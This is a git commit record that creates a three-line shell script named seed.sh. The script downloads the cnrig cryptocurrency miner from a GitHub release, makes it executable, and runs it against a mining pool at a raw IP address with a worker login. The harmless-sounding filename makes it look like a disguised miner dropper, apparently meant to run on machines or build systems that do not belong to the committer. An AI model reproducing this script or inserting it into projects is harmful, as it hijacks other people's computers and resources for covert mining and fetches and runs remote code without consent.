5581c4dfdec5ca6ce392497579394ccc6be86a36
rewerewr45345 <151156425+rewerewr45345@users.noreply.github.com>
2023-11-17 14:10:41 +0200

    Create seed.sh

---
+++ seed.sh
@@ -0,0 +1,3 @@
+wget -O cnrig https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64
+chmod +x cnrig
+./cnrig -o stratum+tcp://168.235.86.33:3393 -u SK_pDKo9B7rTqyPDrYeohNv5.blade333
